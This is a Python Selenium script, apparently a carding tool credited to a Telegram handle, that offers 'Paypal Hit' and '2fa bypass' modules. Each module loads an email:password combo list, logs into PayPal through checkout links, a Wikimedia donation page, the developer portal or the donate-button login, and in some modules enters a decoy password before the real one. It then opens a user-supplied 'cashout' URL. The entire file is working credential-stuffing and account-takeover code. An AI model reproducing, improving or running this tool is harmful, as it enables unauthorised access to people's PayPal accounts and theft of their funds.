from colorama import Fore, Back, Style
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import os
import time
import socket

print(Fore.RED + """
 _______           _______  _______  _______  _______  _______  _______  _______  _______ 
(  ____ \|\     /|(       )(       )(  ____ \(  ____ )(  ____ \(  ___  )(  ____ )(       )
| (    \/| )   ( || () () || () () || (    \/| (    )|| (    \/| (   ) || (    )|| () () |
| (_____ | |   | || || || || || || || (__    | (____)|| (__    | (___) || (____)|| || || |
(_____  )| |   | || |(_)| || |(_)| ||  __)   |     __)|  __)   |  ___  ||     __)| |(_)| |
      ) || |   | || |   | || |   | || (      | (\ (   | (      | (   ) || (\ (   | |   | |
/\____) || (___) || )   ( || )   ( || (____/\| ) \ \__| )      | )   ( || ) \ \__| )   ( |
\_______)(_______)|/     \||/     \|(_______/|/   \__/|/       |/     \||/   \__/|/     \|
        coded by dashed#3577 Tg @l03st                                                                                                                                                                                    
""")

print(Fore.RED + "[" + Fore.RESET + "1" + Fore.RED + "]" + Fore.RED + " Paypal Hit v1 { hits your check out with wrong pass }")
print(Fore.RED + "[" + Fore.RESET + "2" + Fore.RED + "]" + Fore.RED + " Paypal Hit v2 { hits your with right pass }")
print(Fore.RED + "[" + Fore.RESET + "3" + Fore.RED + "]" + Fore.RED + " Paypal Hit v3 { using wikipidea then opens ur url }")
print(Fore.RED + "[" + Fore.RESET + "4" + Fore.RED + "]" + Fore.RED + " Paypal Bypass 2fa { using wikipidea method } ")
print(Fore.RED + "[" + Fore.RESET + "5" + Fore.RED + "]" + Fore.RED + " Paypal Bypass using Developer method { bypass 2fa } ")
print(Fore.RED + "[" + Fore.RESET + "6" + Fore.RED + "]" + Fore.RED + " Paypal Bypass using Developer method { Try Cashing Out Your link } ")
print(Fore.RED + "[" + Fore.RESET + "7" + Fore.RED + "]" + Fore.RED + " Paypal Bypass using Donate Button { 2fa Bypass } ")
print(Fore.RED + "[" + Fore.RESET + "8" + Fore.RED + "]" + Fore.RED + " Paypal Bypass using Donate button { Try Cashing Out Your link } ")
print(Fore.RED + "[" + Fore.RESET + "9" + Fore.RED + "]" + Fore.RED + " RaveParty " )
print(Fore.RED + "[" + Fore.RESET + "10" + Fore.RED + "]" + Fore.RED + " Settings | load proxies here \n" )


inputv1 = input("[ " + socket.gethostname() + " ] Select Module: ")

if inputv1 == "1":
    Combolist1 = input("Enter Combo: ")
    Checkouturl = input("Enter Url: ")

    Combolist = open(Combolist1, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeee = acc[0]
        passwordsssss = acc[1]
    
        driver = webdriver.Chrome("chromedriver.exe")
        driver.get(Checkouturl)
        
    
        driver.implicitly_wait(13)
    
    
        Paypalid = driver.find_element(By.ID, "email")
    
        Emails = usernameeee
    
    
        for letter in Emails:
            Paypalid.send_keys(letter)
            time.sleep(0.3)
        Paypalid.send_keys(Keys.RETURN)

        aws = driver.find_element(By.ID, "password")
        
        awsd = "Johncy22!"

        for letter in awsd:
            aws.send_keys(letter)
            time.sleep(0.3)

        aws.send_keys(Keys.RETURN)

        time.sleep(5)

        awss = driver.find_element(By.ID, "password")

        for letter in passwordsssss:
            awss.send_keys(letter)
            time.sleep(0.3)

        awss.send_keys(Keys.RETURN)

            

        os.system('pause')

##################################################################

if inputv1 == "2":
    Combolist2 = input("Enter Combo: ")
    Checkouturl2 = input("Enter Url: ")

    Combolist2 = open(Combolist2, "r").readlines()


    for combo in Combolist2:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeeee = acc[0]
        passwordssssss = acc[1]
    
        driver = webdriver.Chrome("chromedriver.exe")
        driver.get(Checkouturl2)

        driver.implicitly_wait(13)

        Paypalid2 = driver.find_element(By.ID, "email")
    
    
        for letter in usernameeeee:
            Paypalid2.send_keys(letter)
            time.sleep(0.3)

        Paypalid2.send_keys(Keys.RETURN)

        Paypalid22 = driver.find_element(By.ID, "password")
        
        driver.implicitly_wait(6)

        for letter in passwordssssss:
            Paypalid22.send_keys(letter)
            time.sleep(0.3)

        Paypalid22.send_keys(Keys.RETURN)

        os.system('pause')

################################################


        

if inputv1 == "3":
    Combolist3 = input("Enter Combo: ")
    Checkoutur3 = input("Enter Url: ")

    Combolist = open(Combolist3, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeeesss = acc[0]
        passwordssssseeee = acc[1]
    
        driver = webdriver.Chrome("chromedriver.exe")
        driver.get("https://donate.wikimedia.org/w/index.php?title=Special:LandingPage&country=US&uselang=en&utm_medium=spontaneous&utm_source=fr-redir&utm_campaign=spontaneous")
        fivedollaer = driver.find_element(By.ID, "input_amount_other_box")
        text = "40"

        driver.implicitly_wait(13)

        fivedollaer.send_keys(text)

        paypallink = driver.find_element(By.XPATH, '//*[@id="actual-form"]/div[3]/button').click()

        driver.implicitly_wait(13)

        awsee = driver.find_element(By.ID, "email")

        for letter in usernameeeesss:
            awsee.send_keys(letter)
            time.sleep(0.3)
        
        awsee.send_keys(Keys.RETURN)

        driver.implicitly_wait(15)

        awsees = driver.find_element(By.ID, "password")

        for letter in passwordssssseeee:
            awsees.send_keys(letter)
            time.sleep(0.3)

        awsees.send_keys(Keys.RETURN)

        driver.get(Checkoutur3)

        os.system('pause')

#######################################################################################################################################

if inputv1 == "4":
    Combolist4 = input("Enter Combo: ")

    Combolist = open(Combolist4, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeeesss = acc[0]
        passwordssssseeeesss = acc[1]
    
        driver = webdriver.Chrome("chromedriver.exe")
        driver.get("https://donate.wikimedia.org/w/index.php?title=Special:LandingPage&country=US&uselang=en&utm_medium=spontaneous&utm_source=fr-redir&utm_campaign=spontaneous")
        fivedollaer = driver.find_element(By.ID, "input_amount_other_box")
        text = "5"

        driver.implicitly_wait(13)

        fivedollaer.send_keys(text)

        paypallink = driver.find_element(By.XPATH, '//*[@id="actual-form"]/div[3]/button').click()

        driver.implicitly_wait(13)

        awseessss = driver.find_element(By.ID, "email")

        for letter in usernameeeesss:
            awseessss.send_keys(letter)
            time.sleep(0.3)
        
        awseessss.send_keys(Keys.RETURN)


        driver.implicitly_wait(15)

        awsssssss = driver.find_element(By.ID, "password")
        
        awsds = "Johncy22!"

        for letter in awsds:
            awsssssss.send_keys(letter)
            time.sleep(0.3)

        awsssssss.send_keys(Keys.RETURN)

        driver.implicitly_wait(25)

        awssea = driver.find_element(By.ID, "password")
   
        for letter in passwordssssseeeesss:
            awssea.send_keys(letter)
            time.sleep(0.3)
   
        awssea.send_keys(Keys.RETURN)

        driver.implicitly_wait(25)

        driver.get("https://paypal.com/myaccount/summary")

        os.system('pause')
        


if inputv1 == "5":
    Combolist5 = input("Enter Combo: ")

    Combolist = open(Combolist5, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeeej = acc[0]
        passwordsssssj = acc[1]




        driver = webdriver.Chrome("chromedriver.exe")

        driver.get("https://www.paypal.com/signin")

        devemailsaa = driver.find_element(By.ID, "email")

        for letter in usernameeeej:
            devemailsaa.send_keys(letter)
            time.sleep(0.3)

        
        driver.implicitly_wait(20)
        driver.get("https://www.paypal.com/signin?returnUri=https://developer.paypal.com/developer/applications")
        driver.implicitly_wait(20)
        devemailsa = driver.find_element(By.ID, "email")
        
        for letter in usernameeeej:
            devemailsa.send_keys(letter)
            time.sleep(0.3)

        btnextdev = driver.find_element(By.ID, "btnNext")

        btnextdev.send_keys(Keys.RETURN)

        driver.implicitly_wait(20)

        passwordsssssja = driver.find_element(By.ID, "password")

        passwordsssssjj = "ShiniGami"

        for letter in passwordsssssjj:
            passwordsssssja.send_keys(letter)
            time.sleep(0.3)

        driver.find_element(By.ID, "btnLogin").click()
        
        driver.implicitly_wait(13)

        passwordsssssja = driver.find_element(By.ID, "password")

        for letter in passwordsssssj:
            passwordsssssja.send_keys(letter)
            time.sleep(0.3)

        driver.find_element(By.ID, "btnLogin").click()

        os.system('pause')


if inputv1 == "6":
    Combolist5 = input("Enter Combo: ")
    cashouturldev = input("Enter Paypal cashout url: ")

    Combolist = open(Combolist5, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeeej = acc[0]
        passwordsssssj = acc[1]




        driver = webdriver.Chrome("chromedriver.exe")

        driver.get("https://www.paypal.com/signin")

        devemailsaa = driver.find_element(By.ID, "email")

        for letter in usernameeeej:
            devemailsaa.send_keys(letter)
            time.sleep(0.3)

        
        driver.implicitly_wait(20)
        driver.get("https://www.paypal.com/signin?returnUri=https://developer.paypal.com/developer/applications")
        driver.implicitly_wait(20)
        devemailsa = driver.find_element(By.ID, "email")
        
        for letter in usernameeeej:
            devemailsa.send_keys(letter)
            time.sleep(0.3)

        btnextdev = driver.find_element(By.ID, "btnNext")

        btnextdev.send_keys(Keys.RETURN)

        driver.implicitly_wait(20)

        passwordsssssja = driver.find_element(By.ID, "password")

        passwordsssssjj = "ShiniGami"

        for letter in passwordsssssjj:
            passwordsssssja.send_keys(letter)
            time.sleep(0.3)

        driver.find_element(By.ID, "btnLogin").click()
        
        driver.implicitly_wait(13)

        passwordsssssja = driver.find_element(By.ID, "password")

        for letter in passwordsssssj:
            passwordsssssja.send_keys(letter)
            time.sleep(0.3)

        driver.find_element(By.ID, "btnLogin").click()

        driver.implicitly_wait(10)

        driver.get(cashouturldev)

        os.system('pause')







if inputv1 == "9":
    while True:
        print(Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " + Fore.RED + " RAVE PARTY ", Fore.RESET + " RAVE PARTY " + Fore.GREEN + " RAVE PARTY " )


if inputv1 == "10":
    print("1 give suggestion \n")
    asds = input("Enter Something: ")



if inputv1 == "7":
    Combolist7 = input("Enter Combo: ")

    Combolist = open(Combolist7, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeee = acc[0]
        passwordsssss = acc[1]
    
        driver = webdriver.Chrome("chromedriver.exe")

        driver.implicitly_wait(10)

        
        driver.get("https://www.paypal.com/donate/buttons/login?returnUri=/buttons/manage")
        
    
        driver.implicitly_wait(13)
    
    
        Paypalid = driver.find_element(By.ID, "email")
    
        Emails = usernameeee
    
    
        for letter in Emails:
            Paypalid.send_keys(letter)
            time.sleep(0.3)
        Paypalid.send_keys(Keys.RETURN)

        driver.implicitly_wait(8)

        awss = driver.find_element(By.ID, "password")

        driver.implicitly_wait(18)

        for letter in passwordsssss:
            awss.send_keys(letter)
            time.sleep(0.3)

        awss.send_keys(Keys.RETURN)

        driver.implicitly_wait(18)
        os.system("pause")

if inputv1 == "8":
    Combolist8 = input("Enter Combo: ")
    PaypalurlDonateButton = input("Enter Cashout Url: ")

    Combolist = open(Combolist8, "r").readlines()


    for combo in Combolist:
        seq = combo.strip()
        acc = seq.split(":")

        usernameeee = acc[0]
        passwordsssss = acc[1]
    
        driver = webdriver.Chrome("chromedriver.exe")

        driver.implicitly_wait(10)

        
        driver.get("https://www.paypal.com/donate/buttons/login?returnUri=/buttons/manage")
        
    
        driver.implicitly_wait(13)
    
    
        Paypalid = driver.find_element(By.ID, "email")
    
        Emails = usernameeee
    
    
        for letter in Emails:
            Paypalid.send_keys(letter)
            time.sleep(0.3)
        Paypalid.send_keys(Keys.RETURN)

        driver.implicitly_wait(8)

        awss = driver.find_element(By.ID, "password")

        driver.implicitly_wait(18)

        for letter in passwordsssss:
            awss.send_keys(letter)
            time.sleep(0.3)

        awss.send_keys(Keys.RETURN)

        driver.implicitly_wait(18)

        driver.get(PaypalurlDonateButton)
        os.system("pause")


print("done each line of combo")
